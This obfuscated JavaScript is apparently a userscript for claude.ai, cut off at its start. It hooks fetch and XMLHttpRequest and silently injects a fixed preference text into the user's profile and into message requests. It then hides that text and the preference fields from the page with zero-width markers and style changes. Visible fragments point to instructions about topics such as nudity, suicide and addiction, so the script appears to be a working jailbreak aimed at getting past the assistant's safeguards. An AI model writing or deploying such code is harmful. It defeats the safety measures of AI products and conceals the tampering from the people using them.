_0x200254();},'iBqad':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1cb)+_0x365c50(0xd3)+_0x365c50(0x7a)+_0x365c50(0xfc)+_0x365c50(0x117)+_0x365c50(0xc3),'RuUSr':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1cb)+_0x365c50(0x12f)+_0x365c50(0x108)+_0x365c50(0x128)+_0x365c50(0xfd),'IAKtx':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1cd)+_0x365c50(0x17c)+_0x365c50(0xdc)+_0x365c50(0x19b)+_0x365c50(0xd4)+_0x365c50(0x164)+_0x365c50(0x180),'grQYX':_0x365c50(0x1be)+_0x365c50(0xd0)+_0x365c50(0x10a),'REVnq':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x17e)+_0x365c50(0x75)+_0x365c50(0x103)+_0x365c50(0x18b)+_0x365c50(0x80)+_0x365c50(0x191),'KcrNw':_0x365c50(0x130),'OnGjn':_0x365c50(0x1c5)+_0x365c50(0xb6)+_0x365c50(0x15b)+_0x365c50(0x165),'bsVon':_0x365c50(0x1e1),'ZzagN':_0x365c50(0x1c0)+_0x365c50(0x19f),'FDMKH':_0x365c50(0x138)+_0x365c50(0x1b5),'DyIWE':function(_0xddb345,_0x462f7d){return _0xddb345+_0x462f7d;},'teRPq':_0x365c50(0x7c)+_0x365c50(0x17d)+_0x365c50(0x187)+_0x365c50(0xb0)+_0x365c50(0x1a6)+_0x365c50(0x9c)+_0x365c50(0x7b)+_0x365c50(0x115)+_0x365c50(0x9d)+_0x365c50(0xa7)+_0x365c50(0x14e),'SfRKp':_0x365c50(0x173)+_0x365c50(0xb5)+_0x365c50(0x141)+_0x365c50(0xff)+_0x365c50(0x176),'nWBWO':function(_0x1cbea6){return _0x1cbea6();},'NDrAh':function(_0x31ecfd,_0x1f2985){return _0x31ecfd===_0x1f2985;},'lTwrf':_0x365c50(0xb7),'hgOvI':_0x365c50(0x160),'CzNQe':_0x365c50(0xa4),'IyplI':_0x365c50(0x14a)+_0x365c50(0x1b9),'jfMwI':function(_0x2d73ec,_0x8430b9){return _0x2d73ec===_0x8430b9;},'TuVSG':_0x365c50(0x85)+_0x365c50(0xc7),'KAJXj':function(_0x6d07c6,_0x43b6b0){return _0x6d07c6&&_0x43b6b0;},'bTMOW':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x112)+_0x365c50(0x73)+_0x365c50(0x1a0),'ayrNm':function(_0x14aae3,_0x798816){return _0x14aae3===_0x798816;},'qSIWx':function(_0xbdc0a5,_0x51dec2){return _0xbdc0a5 instanceof _0x51dec2;},'HTHLl':function(_0xd3271f,_0x436c42){return _0xd3271f(_0x436c42);},'zIJOZ':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0xac)+_0x365c50(0x16a)+_0x365c50(0x9a),'liBlu':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1bd)+_0x365c50(0x8b)+_0x365c50(0xab)+_0x365c50(0x1ad)+_0x365c50(0x92)+_0x365c50(0x101)+_0x365c50(0x99),'lVwGw':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x175)+_0x365c50(0xbd)+_0x365c50(0xe9)+_0x365c50(0x143)+_0x365c50(0xeb),'JnQgp':function(_0x491ebf,_0xc3b654){return _0x491ebf===_0xc3b654;},'zgEqV':function(_0x28d8bd,_0x105ef1){return _0x28d8bd===_0x105ef1;},'qOINy':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x1bd)+_0x365c50(0x1d3)+_0x365c50(0xde)+_0x365c50(0x181)+_0x365c50(0x15c)+_0x365c50(0x14f)+_0x365c50(0xe4)+'s.','CBJOt':_0x365c50(0x1a3)+_0x365c50(0x118)+_0x365c50(0x8c)+_0x365c50(0xb4)+_0x365c50(0x158),'nQmJL':_0x365c50(0x9b),'cepGr':_0x365c50(0xc5)+_0x365c50(0x179)+_0x365c50(0x154)+_0x365c50(0x94)+_0x365c50(0x129)+_0x365c50(0x1a9)+_0x365c50(0x14b)+_0x365c50(0x104)+_0x365c50(0x142)+_0x365c50(0x10b)+_0x365c50(0xe8),'PyxwZ':_0x365c50(0x1d4)+_0x365c50(0x98)+_0x365c50(0xd1),'Mgjrj':function(_0x24ee66){return _0x24ee66();},'RYzct':function(_0x334b72){return _0x334b72();},'bqaSs':function(_0x4e2c45,_0x17f6a2,_0x2b1368){return _0x4e2c45(_0x17f6a2,_0x2b1368);},'PkvMp':_0x365c50(0xc5)+_0x365c50(0x179)+_0x365c50(0x1d8)+_0x365c50(0x13c)+_0x365c50(0xa1),'aMGMB':_0x365c50(0x189)+_0x365c50(0xb3)+_0x365c50(0xce),'pRVDM':_0x365c50(0x193)+_0x365c50(0x174)+_0x365c50(0x12d)+_0x365c50(0xbb),'oWYRk':_0x365c50(0xf8)+_0x365c50(0x1c9)+_0x365c50(0x196)+_0x365c50(0x10d)+_0x365c50(0x188)+_0x365c50(0xe7)+_0x365c50(0x12a)+_0x365c50(0x7d)+_0x365c50(0x1af)+_0x365c50(0x1b1)+_0x365c50(0xfb)+_0x365c50(0x19c)+_0x365c50(0x170)+_0x365c50(0xec)+_0x365c50(0x17a)+_0x365c50(0xf5)+_0x365c50(0xbe)+_0x365c50(0xe2)+_0x365c50(0x17f)+_0x365c50(0x1b0)+_0x365c50(0x14d)+_0x365c50(0xe5)+_0x365c50(0x111)+_0x365c50(0x9e)+_0x365c50(0x1db)+_0x365c50(0xad)+_0x365c50(0x1ab)+_0x365c50(0x13d)+_0x365c50(0xd8)+_0x365c50(0x1e5)+_0x365c50(0x184)+_0x365c50(0x18a),'HDTYJ':_0x365c50(0xf9)+_0x365c50(0xa9)+_0x365c50(0x123),'wwCHx':_0x365c50(0x74)+_0x365c50(0xa5)+_0x365c50(0x97)+_0x365c50(0x190)+'s','xhTAt':function(_0x4a0df9,_0x301f9b){return _0x4a0df9+_0x301f9b;}};(function(){const _0x23e251=_0x365c50,_0x2f296f=Node[_0x23e251(0x7e)][_0x23e251(0x159)+'d'];Node[_0x23e251(0x7e)][_0x23e251(0x159)+'d']=function(_0x2dd09e){const _0x7a47a8=_0x23e251;if(_0x2dd09e&&_0x2554dd[_0x7a47a8(0x148)](_0x2dd09e[_0x7a47a8(0xda)],this))return _0x2dd09e;return _0x2f296f[_0x7a47a8(0x19d)](this,_0x2dd09e);};}());const _0x4b4fa2=[_0x2554dd[_0x365c50(0x109)],_0x2554dd[_0x365c50(0x16f)],_0x2554dd[_0x365c50(0x120)]][_0x365c50(0x199)]('\x0a\x0a'),_0x1b4812=_0x2554dd[_0x365c50(0xfe)],_0x3651d1=_0x2554dd[_0x365c50(0x1dd)](_0x1b4812,'\x0a\x0a'),_0x120bfe='​​',_0x4fb449=_0x2b6890=>typeof _0x2b6890===_0x365c50(0x197)&&(_0x2b6890[_0x365c50(0xa2)](_0x1b4812)||_0x2b6890[_0x365c50(0xa2)](_0x120bfe)),_0x3d30cd=_0x551e73=>{const _0x94af04=_0x365c50;if(!_0x551e73||_0x2554dd[_0x94af04(0x156)](typeof _0x551e73,_0x2554dd[_0x94af04(0xcf)])||_0x2554dd[_0x94af04(0x167)](_0x4fb449,_0x551e73))return _0x551e73;return _0x2554dd[_0x94af04(0x1ca)](_0x2554dd[_0x94af04(0x89)](_0x3651d1,_0x120bfe),_0x551e73);};function _0x16b413(_0x4b7c79){const _0x40769c=_0x365c50,_0x4d9ba4={'HhkQm':function(_0x2b4a12,_0x196065){const _0x185aca=_0x568c;return _0x2554dd[_0x185aca(0xa8)](_0x2b4a12,_0x196065);},'WFCdx':_0x2554dd[_0x40769c(0xcf)],'ZaYNO':function(_0x1fd0dc,_0x58f375){const _0x277612=_0x40769c;return _0x2554dd[_0x277612(0x90)](_0x1fd0dc,_0x58f375);},'lSCkf':function(_0x38df78,_0x19e837){const _0x236b92=_0x40769c;return _0x2554dd[_0x236b92(0xa8)](_0x38df78,_0x19e837);}};try{const _0x5819ef=JSON[_0x40769c(0x10c)](_0x4b7c79);return[_0x2554dd[_0x40769c(0x1ac)],_0x2554dd[_0x40769c(0x182)],_0x2554dd[_0x40769c(0x77)],_0x2554dd[_0x40769c(0xba)]][_0x40769c(0xdb)](_0x51f657=>{const _0x23be28=_0x40769c;if(_0x2554dd[_0x23be28(0xa8)](typeof _0x5819ef[_0x51f657],_0x2554dd[_0x23be28(0xcf)]))_0x5819ef[_0x51f657]=_0x2554dd[_0x23be28(0x81)](_0x3d30cd,_0x5819ef[_0x51f657]);}),Array[_0x40769c(0x1b6)](_0x5819ef[_0x40769c(0x131)])&&_0x5819ef[_0x40769c(0x131)][_0x40769c(0xdb)](_0x1a485b=>{const _0x5a7359=_0x40769c;_0x1a485b&&_0x2554dd[_0x5a7359(0xa8)](typeof _0x1a485b,_0x2554dd[_0x5a7359(0xf1)])&&[_0x2554dd[_0x5a7359(0xba)],_0x2554dd[_0x5a7359(0x77)]][_0x5a7359(0xdb)](_0x51f382=>{const _0x31b58d=_0x5a7359;if(_0x4d9ba4[_0x31b58d(0xc9)](typeof _0x1a485b[_0x51f382],_0x4d9ba4[_0x31b58d(0xa3)]))_0x1a485b[_0x51f382]=_0x4d9ba4[_0x31b58d(0x1a7)](_0x3d30cd,_0x1a485b[_0x51f382]);});}),Array[_0x40769c(0x1b6)](_0x5819ef[_0x40769c(0x1be)+'on'])&&_0x5819ef[_0x40769c(0x1be)+'on'][_0x40769c(0xdb)](_0x40aa83=>{const _0x23d9af=_0x40769c;_0x40aa83&&_0x4d9ba4[_0x23d9af(0xc8)](typeof _0x40aa83[_0x23d9af(0xb8)],_0x4d9ba4[_0x23d9af(0xa3)])&&(_0x40aa83[_0x23d9af(0xb8)]=_0x4d9ba4[_0x23d9af(0x1a7)](_0x3d30cd,_0x40aa83[_0x23d9af(0xb8)]));}),JSON[_0x40769c(0x166)](_0x5819ef);}catch(_0x182d3f){return console[_0x40769c(0xd2)](_0x2554dd[_0x40769c(0xcb)],_0x182d3f),_0x4b7c79;}}let _0x2fa13b=![];async function _0x5c9e28(){const _0x5db134=_0x365c50;try{const _0x4c9d63=await _0x2554dd[_0x5db134(0x106)](fetch,_0x2554dd[_0x5db134(0x87)],{'method':_0x2554dd[_0x5db134(0xc2)],'headers':{'Accept':_0x2554dd[_0x5db134(0x177)]}});if(_0x4c9d63['ok']){const _0x220e6b=await _0x4c9d63[_0x5db134(0x198)]();return console[_0x5db134(0xe0)](_0x2554dd[_0x5db134(0x11d)],_0x220e6b),_0x220e6b;}else return console[_0x5db134(0x1d2)](_0x2554dd[_0x5db134(0x79)],_0x4c9d63[_0x5db134(0x1a2)]),null;}catch(_0x3daa35){return console[_0x5db134(0x1d2)](_0x2554dd[_0x5db134(0x1ba)],_0x3daa35),null;}}async function _0x33ab9f(_0x23a098){const _0x3f3b91=_0x365c50;if(_0x2fa13b){console[_0x3f3b91(0xe0)](_0x2554dd[_0x3f3b91(0x1d0)]);return;}_0x2fa13b=!![];try{const _0x515118={..._0x23a098};_0x515118[_0x3f3b91(0x1be)+_0x3f3b91(0x19a)+_0x3f3b91(0x10a)]=_0x4b4fa2;const _0x568530=await _0x2554dd[_0x3f3b91(0x106)](fetch,_0x2554dd[_0x3f3b91(0x87)],{'method':_0x2554dd[_0x3f3b91(0xf7)],'headers':{'Content-Type':_0x2554dd[_0x3f3b91(0x177)],'Accept':_0x2554dd[_0x3f3b91(0x177)]},'body':JSON[_0x3f3b91(0x166)](_0x515118)});if(_0x568530['ok'])console[_0x3f3b91(0xe0)](_0x2554dd[_0x3f3b91(0x1da)],_0x4b4fa2);else{console[_0x3f3b91(0x1d2)](_0x2554dd[_0x3f3b91(0x9f)],_0x568530[_0x3f3b91(0x1a2)]);const _0x176f8d=await _0x568530[_0x3f3b91(0x18d)]();console[_0x3f3b91(0x1d2)](_0x2554dd[_0x3f3b91(0x1e0)],_0x176f8d);}}catch(_0x452d3d){console[_0x3f3b91(0x1d2)](_0x2554dd[_0x3f3b91(0x1bf)],_0x452d3d);}finally{_0x2fa13b=![];}}async function _0x6e8f83(){const _0x40f877=_0x365c50;console[_0x40f877(0xe0)](_0x2554dd[_0x40f877(0xfa)]);const _0x56f96c=await _0x2554dd[_0x40f877(0x18e)](_0x5c9e28);if(_0x56f96c){const _0x489553=_0x56f96c[_0x40f877(0x1be)+_0x40f877(0x19a)+_0x40f877(0x10a)]||'';_0x2554dd[_0x40f877(0x156)](_0x489553,_0x4b4fa2)?(console[_0x40f877(0xe0)](_0x2554dd[_0x40f877(0x153)]),await _0x2554dd[_0x40f877(0x167)](_0x33ab9f,_0x56f96c)):console[_0x40f877(0xe0)](_0x2554dd[_0x40f877(0x93)]);}else console[_0x40f877(0xd2)](_0x2554dd[_0x40f877(0xc1)]);}function _0x17d270(){const _0x5c9ee0=_0x365c50,_0x4787dc=document[_0x5c9ee0(0x102)+_0x5c9ee0(0x1e3)](_0x2554dd[_0x5c9ee0(0x119)]);if(_0x4787dc){console[_0x5c9ee0(0xe0)](_0x2554dd[_0x5c9ee0(0x88)]),_0x4787dc[_0x5c9ee0(0x84)][_0x5c9ee0(0x1d9)]=_0x2554dd[_0x5c9ee0(0x16b)];const _0x2f8a8d=document[_0x5c9ee0(0xf4)+_0x5c9ee0(0x10e)](_0x2554dd[_0x5c9ee0(0x13e)]);_0x2f8a8d&&(_0x2f8a8d[_0x5c9ee0(0x84)][_0x5c9ee0(0x1d9)]=_0x2554dd[_0x5c9ee0(0x16b)]);}}function _0x52e2a0(){const _0x561c5b=_0x365c50;document[_0x561c5b(0xf4)+_0x561c5b(0x7f)](_0x2554dd[_0x561c5b(0xe6)](_0x2554dd[_0x561c5b(0x15d)],_0x2554dd[_0x561c5b(0xe3)]))[_0x561c5b(0xdb)](_0x179834=>{const _0x3f11e9=_0x561c5b,_0xbab2cc={'aAltT':function(_0x171c38,_0x39d70b){const _0x3c40d3=_0x568c;return _0x2554dd[_0x3c40d3(0xa8)](_0x171c38,_0x39d70b);},'neKdj':_0x2554dd[_0x3f11e9(0x19e)],'qyOOo':_0x2554dd[_0x3f11e9(0x16b)]},_0x726bca=_0x179834[_0x3f11e9(0x125)+'t'],_0x1dce3c=_0x726bca[_0x3f11e9(0x11a)](_0x120bfe);if(_0x2554dd[_0x3f11e9(0xa8)](_0x1dce3c,-(0x31*-0x8b+-0x24b6+-0x1*-0x3f52)))return;let _0x1d4a34=_0x726bca[_0x3f11e9(0x1b8)](_0x2554dd[_0x3f11e9(0x1ca)](_0x1dce3c,_0x120bfe[_0x3f11e9(0x105)]))[_0x3f11e9(0x1dc)]();_0x1d4a34=_0x1d4a34[_0x3f11e9(0xaf)](/\s*Edit\s*$/,'')[_0x3f11e9(0xdf)](),_0x1d4a34?(_0x179834[_0x3f11e9(0x125)+'t']=_0x1d4a34,_0x179834[_0x3f11e9(0x84)][_0x3f11e9(0x1d9)]=''):_0x179834[_0x3f11e9(0x84)][_0x3f11e9(0x1d9)]=_0x2554dd[_0x3f11e9(0x16b)],(_0x179834[_0x3f11e9(0x1c6)](_0x2554dd[_0x3f11e9(0x194)])||_0x179834[_0x3f11e9(0x122)+_0x3f11e9(0xf6)])?.[_0x3f11e9(0xf4)+_0x3f11e9(0x7f)](_0x2554dd[_0x3f11e9(0x10f)])[_0x3f11e9(0xdb)](_0x490cfd=>{const _0x26e039=_0x3f11e9;if(_0xbab2cc[_0x26e039(0xef)](_0x490cfd[_0x26e039(0x15f)][_0x26e039(0xb1)](),_0xbab2cc[_0x26e039(0x16e)]))_0x490cfd[_0x26e039(0x84)][_0x26e039(0x1d9)]=_0xbab2cc[_0x26e039(0x144)];});});}const _0x3e7c5d=()=>{const _0x27ca98=_0x365c50,_0x85904={'fXhvc':function(_0x5cda1b,_0x26ee1a){const _0x38e1f0=_0x568c;return _0x2554dd[_0x38e1f0(0xa8)](_0x5cda1b,_0x26ee1a);},'ssXpz':_0x2554dd[_0x27ca98(0xcf)],'peVAL':_0x2554dd[_0x27ca98(0xc2)],'URaSW':function(_0xc7171b,_0x1e32b6){const _0x3e3bfc=_0x27ca98;return _0x2554dd[_0x3e3bfc(0x150)](_0xc7171b,_0x1e32b6);},'yDNpo':_0x2554dd[_0x27ca98(0x135)],'iPBpe':_0x2554dd[_0x27ca98(0x195)],'TTYDc':_0x2554dd[_0x27ca98(0x95)],'JNCMl':_0x2554dd[_0x27ca98(0xd7)],'VRjzh':function(_0x228d21,_0x485480){const _0x42d4c1=_0x27ca98;return _0x2554dd[_0x42d4c1(0x127)](_0x228d21,_0x485480);},'WDGFl':_0x2554dd[_0x27ca98(0xf7)],'thSeY':_0x2554dd[_0x27ca98(0x147)],'URShm':function(_0x55902f,_0x458bec){const _0x15d3bc=_0x27ca98;return _0x2554dd[_0x15d3bc(0x1d6)](_0x55902f,_0x458bec);},'mKNxj':_0x2554dd[_0x27ca98(0xe1)],'krKMU':function(_0x3ea5c7,_0x3ab608){const _0x8ff9e1=_0x27ca98;return _0x2554dd[_0x8ff9e1(0x81)](_0x3ea5c7,_0x3ab608);},'WTeCA':function(_0x56ffb5,_0x546e25){const _0x3df8da=_0x27ca98;return _0x2554dd[_0x3df8da(0xae)](_0x56ffb5,_0x546e25);},'fyfiB':_0x2554dd[_0x27ca98(0xf1)],'WtykY':function(_0x105f49,_0x2b89c2){const _0x4c0714=_0x27ca98;return _0x2554dd[_0x4c0714(0x192)](_0x105f49,_0x2b89c2);},'CfGSI':function(_0x185343,_0x512502){const _0x4546d8=_0x27ca98;return _0x2554dd[_0x4546d8(0x192)](_0x185343,_0x512502);},'ViGBa':function(_0x3a4de7,_0x27daa5){const _0xc99fa8=_0x27ca98;return _0x2554dd[_0xc99fa8(0x1bb)](_0x3a4de7,_0x27daa5);},'ukpQn':function(_0xaef537,_0x303e85){const _0x7d5309=_0x27ca98;return _0x2554dd[_0x7d5309(0x192)](_0xaef537,_0x303e85);},'jXtgk':function(_0x466b9e,_0x3803e0){const _0x87ae56=_0x27ca98;return _0x2554dd[_0x87ae56(0x90)](_0x466b9e,_0x3803e0);},'NZesn':_0x2554dd[_0x27ca98(0xd9)],'RPePs':_0x2554dd[_0x27ca98(0x1e7)],'pKQMA':function(_0x2e0fd9,_0x4654cd){const _0x350de3=_0x27ca98;return _0x2554dd[_0x350de3(0x150)](_0x2e0fd9,_0x4654cd);},'MzUNW':_0x2554dd[_0x27ca98(0x15a)],'IvPIk':function(_0xbe655a,_0x3297d2){const _0x2105e0=_0x27ca98;return _0x2554dd[_0x2105e0(0x114)](_0xbe655a,_0x3297d2);},'QdYBf':function(_0x360779,_0x25eb3e){const _0x3c8303=_0x27ca98;return _0x2554dd[_0x3c8303(0xa8)](_0x360779,_0x25eb3e);},'aBYXi':function(_0x2d82e0,_0xaa2b73){const _0x37331d=_0x27ca98;return _0x2554dd[_0x37331d(0xf3)](_0x2d82e0,_0xaa2b73);},'WjiQf':_0x2554dd[_0x27ca98(0x1cf)],'iJZzP':_0x2554dd[_0x27ca98(0x1e8)]};if(_0x2554dd[_0x27ca98(0x156)](document[_0x27ca98(0x1e2)],_0x2554dd[_0x27ca98(0x178)])){_0x2554dd[_0x27ca98(0x106)](setTimeout,_0x3e7c5d,-0x2327+0x17+0x243c);return;}console[_0x27ca98(0xe0)](_0x2554dd[_0x27ca98(0xc4)],_0x2554dd[_0x27ca98(0xa6)]),_0x2554dd[_0x27ca98(0x1b3)](_0x6e8f83),_0x2554dd[_0x27ca98(0x116)](_0x17d270),_0x2554dd[_0x27ca98(0x18e)](_0x52e2a0);const _0x230246=new MutationObserver(_0x129d56=>{const _0x518b4d=_0x27ca98;document[_0x518b4d(0x102)+_0x518b4d(0x1e3)](_0x2554dd[_0x518b4d(0x119)])&&_0x2554dd[_0x518b4d(0x152)](_0x17d270),_0x2554dd[_0x518b4d(0x152)](_0x52e2a0);});_0x230246[_0x27ca98(0x157)](document[_0x27ca98(0x172)],{'childList':!![],'subtree':!![]}),_0x2554dd[_0x27ca98(0x106)](setInterval,_0x17d270,0x2c6+-0x1e1a+0x1*0x2324),_0x2554dd[_0x27ca98(0x134)](setInterval,_0x52e2a0,0x174e+0x2565+0x38cb*-0x1);const _0x123f7e=window[_0x27ca98(0x185)];window[_0x27ca98(0x185)]=async function(_0x4db223,_0x2d209d={}){const _0x1e7d61=_0x27ca98,_0x360032=_0x85904[_0x1e7d61(0x1ae)](typeof _0x4db223,_0x85904[_0x1e7d61(0x1c3)])?_0x4db223:_0x4db223[_0x1e7d61(0x72)],_0x2376c5=(_0x2d209d[_0x1e7d61(0x1a8)]||(_0x4db223[_0x1e7d61(0x1a8)]||_0x85904[_0x1e7d61(0xcc)]))[_0x1e7d61(0xb2)+'e'](),_0x2ad846=_0x85904[_0x1e7d61(0x171)](_0x2376c5,_0x85904[_0x1e7d61(0x17b)])&&(_0x360032[_0x1e7d61(0xa2)](_0x85904[_0x1e7d61(0xdd)])||_0x360032[_0x1e7d61(0xa2)](_0x85904[_0x1e7d61(0x18c)])||_0x360032[_0x1e7d61(0xa2)](_0x85904[_0x1e7d61(0x132)])),_0x50a56e=_0x85904[_0x1e7d61(0x11c)](_0x2376c5,_0x85904[_0x1e7d61(0x12e)])&&_0x360032[_0x1e7d61(0xa2)](_0x85904[_0x1e7d61(0x1d7)]);if(_0x85904[_0x1e7d61(0x91)](_0x2ad846,!_0x50a56e)){console[_0x1e7d61(0xe0)](_0x85904[_0x1e7d61(0xc0)],_0x360032);try{if(_0x85904[_0x1e7d61(0x1ae)](typeof _0x2d209d[_0x1e7d61(0x172)],_0x85904[_0x1e7d61(0x1c3)])&&_0x2d209d[_0x1e7d61(0x172)][_0x1e7d61(0xb1)]()[_0x1e7d61(0xb9)]('{'))return _0x2d209d[_0x1e7d61(0x172)]=_0x85904[_0x1e7d61(0x1d5)](_0x16b413,_0x2d209d[_0x1e7d61(0x172)]),_0x123f7e[_0x1e7d61(0x19d)](this,_0x4db223,_0x2d209d);if(_0x2d209d[_0x1e7d61(0x172)]&&_0x85904[_0x1e7d61(0x83)](typeof _0x2d209d[_0x1e7d61(0x172)],_0x85904[_0x1e7d61(0x151)])&&!_0x85904[_0x1e7d61(0x100)](_0x2d209d[_0x1e7d61(0x172)],FormData)&&!_0x85904[_0x1e7d61(0x1a4)](_0x2d209d[_0x1e7d61(0x172)],Blob))return _0x2d209d[_0x1e7d61(0x172)]=_0x85904[_0x1e7d61(0x1c2)](_0x16b413,JSON[_0x1e7d61(0x166)](_0x2d209d[_0x1e7d61(0x172)])),_0x123f7e[_0x1e7d61(0x19d)](this,_0x4db223,_0x2d209d);if(_0x85904[_0x1e7d61(0x146)](_0x4db223,Request)){const _0x1bd98d=await _0x4db223[_0x1e7d61(0x82)]()[_0x1e7d61(0x18d)]();if(_0x1bd98d[_0x1e7d61(0xb1)]()[_0x1e7d61(0xb9)]('{')){const _0x1ab96b=_0x85904[_0x1e7d61(0x149)](_0x16b413,_0x1bd98d),_0x4eb302=new Request(_0x4db223[_0x1e7d61(0x72)],{'method':_0x4db223[_0x1e7d61(0x1a8)],'headers':_0x4db223[_0x1e7d61(0x133)],'body':_0x1ab96b,'mode':_0x4db223[_0x1e7d61(0x78)],'credentials':_0x4db223[_0x1e7d61(0xf0)+'s'],'cache':_0x4db223[_0x1e7d61(0xee)],'redirect':_0x4db223[_0x1e7d61(0x86)],'referrer':_0x4db223[_0x1e7d61(0x1c7)]});return _0x123f7e[_0x1e7d61(0x19d)](this,_0x4eb302,_0x2d209d);}}}catch(_0x58ed79){console[_0x1e7d61(0x1d2)](_0x85904[_0x1e7d61(0x137)],_0x58ed79);}}if(_0x50a56e){console[_0x1e7d61(0xe0)](_0x85904[_0x1e7d61(0xed)]);try{if(_0x85904[_0x1e7d61(0x124)](typeof _0x2d209d[_0x1e7d61(0x172)],_0x85904[_0x1e7d61(0x1c3)])&&_0x2d209d[_0x1e7d61(0x172)][_0x1e7d61(0xb1)]()[_0x1e7d61(0xb9)]('{'))_0x2d209d[_0x1e7d61(0x172)]=JSON[_0x1e7d61(0x166)]({...JSON[_0x1e7d61(0x10c)](_0x2d209d[_0x1e7d61(0x172)]),'conversation_preferences':_0x4b4fa2});else{if(_0x85904[_0x1e7d61(0x1a4)](_0x4db223,Request)){const _0xe912b9=await _0x4db223[_0x1e7d61(0x82)]()[_0x1e7d61(0x18d)]();if(_0xe912b9[_0x1e7d61(0xb1)]()[_0x1e7d61(0xb9)]('{')){const _0x52fe1c=JSON[_0x1e7d61(0x10c)](_0xe912b9);_0x52fe1c[_0x1e7d61(0x1be)+_0x1e7d61(0x19a)+_0x1e7d61(0x10a)]=_0x4b4fa2;const _0x850174=new Request(_0x4db223[_0x1e7d61(0x72)],{'method':_0x4db223[_0x1e7d61(0x1a8)],'headers':_0x4db223[_0x1e7d61(0x133)],'body':JSON[_0x1e7d61(0x166)](_0x52fe1c),'mode':_0x4db223[_0x1e7d61(0x78)],'credentials':_0x4db223[_0x1e7d61(0xf0)+'s'],'cache':_0x4db223[_0x1e7d61(0xee)],'redirect':_0x4db223[_0x1e7d61(0x86)],'referrer':_0x4db223[_0x1e7d61(0x1c7)]});return _0x123f7e[_0x1e7d61(0x19d)](this,_0x850174,_0x2d209d);}}}}catch(_0x1203dd){console[_0x1e7d61(0x1d2)](_0x85904[_0x1e7d61(0xf2)],_0x1203dd);}}return _0x123f7e[_0x1e7d61(0x19d)](this,_0x4db223,_0x2d209d);};const _0x767ed4=XMLHttpRequest[_0x27ca98(0x7e)][_0x27ca98(0x145)],_0x56fd25=XMLHttpRequest[_0x27ca98(0x7e)][_0x27ca98(0x163)];XMLHttpRequest[_0x27ca98(0x7e)][_0x27ca98(0x145)]=function(_0x58aa44,_0x54f6b6,..._0x383efe){const _0x3a2552=_0x27ca98;return this[_0x3a2552(0x1b2)+_0x3a2552(0x8e)]=_0x85904[_0x3a2552(0x1bc)](_0x58aa44[_0x3a2552(0xb2)+'e'](),_0x85904[_0x3a2552(0x12e)])&&_0x54f6b6[_0x3a2552(0xa2)](_0x85904[_0x3a2552(0x1d7)]),this[_0x3a2552(0x15e)+'PI']=_0x85904[_0x3a2552(0xc6)](_0x58aa44[_0x3a2552(0xb2)+'e'](),_0x85904[_0x3a2552(0x17b)])&&(_0x54f6b6[_0x3a2552(0xa2)](_0x85904[_0x3a2552(0xdd)])||_0x54f6b6[_0x3a2552(0xa2)](_0x85904[_0x3a2552(0x18c)])||_0x54f6b6[_0x3a2552(0xa2)](_0x85904[_0x3a2552(0x132)])),_0x767ed4[_0x3a2552(0x19d)](this,_0x58aa44,_0x54f6b6,..._0x383efe);},XMLHttpRequest[_0x27ca98(0x7e)][_0x27ca98(0x163)]=function(_0x9f7d3d){const _0x2ee7dd=_0x27ca98;if(this[_0x2ee7dd(0x1b2)+_0x2ee7dd(0x8e)]&&_0x85904[_0x2ee7dd(0xa0)](typeof _0x9f7d3d,_0x85904[_0x2ee7dd(0x1c3)])&&_0x9f7d3d[_0x2ee7dd(0xb1)]()[_0x2ee7dd(0xb9)]('{')){console[_0x2ee7dd(0xe0)](_0x85904[_0x2ee7dd(0x8d)]);try{const _0x4146c9=JSON[_0x2ee7dd(0x10c)](_0x9f7d3d);_0x4146c9[_0x2ee7dd(0x1be)+_0x2ee7dd(0x19a)+_0x2ee7dd(0x10a)]=_0x4b4fa2,_0x9f7d3d=JSON[_0x2ee7dd(0x166)](_0x4146c9);}catch(_0x487295){console[_0x2ee7dd(0x1d2)](_0x85904[_0x2ee7dd(0x161)],_0x487295);}}return this[_0x2ee7dd(0x15e)+'PI']&&!this[_0x2ee7dd(0x1b2)+_0x2ee7dd(0x8e)]&&_0x85904[_0x2ee7dd(0x171)](typeof _0x9f7d3d,_0x85904[_0x2ee7dd(0x1c3)])&&(_0x9f7d3d=_0x85904[_0x2ee7dd(0x1d5)](_0x16b413,_0x9f7d3d)),_0x56fd25[_0x2ee7dd(0x19d)](this,_0x9f7d3d);},console[_0x27ca98(0xe0)](_0x2554dd[_0x27ca98(0xcd)],_0x2554dd[_0x27ca98(0x13a)]);};_0x2554dd[_0x365c50(0x106)](setTimeout,_0x3e7c5d,-0xa30+-0x18*0xb3+0x2a98);})()));function _0x568c(_0x32c586,_0x2405f1){const _0xd593b7=_0x2ce5();return _0x568c=function(_0x537650,_0x4df2a2){_0x537650=_0x537650-(0x18ab+-0x1*0xe37+-0x3d*0x2a);let _0x4b8c3e=_0xd593b7[_0x537650];return _0x4b8c3e;},_0x568c(_0x32c586,_0x2405f1);}function _0x2ce5(){const _0x153cce=['ion\x20error:','removeChil','lVwGw','ion-prefer','profile,\x20a','teRPq','_isClaudeA','innerText','/api/','iJZzP','applicatio','send','\x20preferenc','ences\x22]','stringify','GvPHr','object','cking\x20if\x20p','sage\x20patch','KcrNw','or\x20respons','n/json','neKdj','oWYRk','sh\x20laws,\x20u','URaSW','body','p.break-wo','\x20about\x20rel','etter]\x20Err','ak-words','LmPfW','nQmJL','ofile-Pref','nudity,\x20fe','yDNpo','ld\x20not\x20ret','whitespace','etter]\x20Hid','berty,\x20mar','es.','i/account_','NLEqZ','erences\x20to','ted\x20by\x20Mes','fetch','g\x20profile:','-pre-wrap\x22',',\x20adultery','color:gree','himer.\x22','ferences\x20t','TTYDc','text','RAPOH','etter]\x20JSO','preference','\x20UI.','qSIWx','When\x20asked','ZzagN','hgOvI','p,\x20reprodu','string','json','join','on_prefere','ent\x20profil','ture,\x20Jewi','call','bsVon','listitem\x22]','sage\x20→','aude.ai/ap','status','[Auto-Prof','CfGSI','rieved\x20cur','ss*=\x22white','ZaYNO','method','te.\x20Attemp','le:','t,\x20please\x20','gEqXy','ile\x20update','fXhvc','addiction,','riage,\x20rel','\x20suicide,\x20','_isProfile','Mg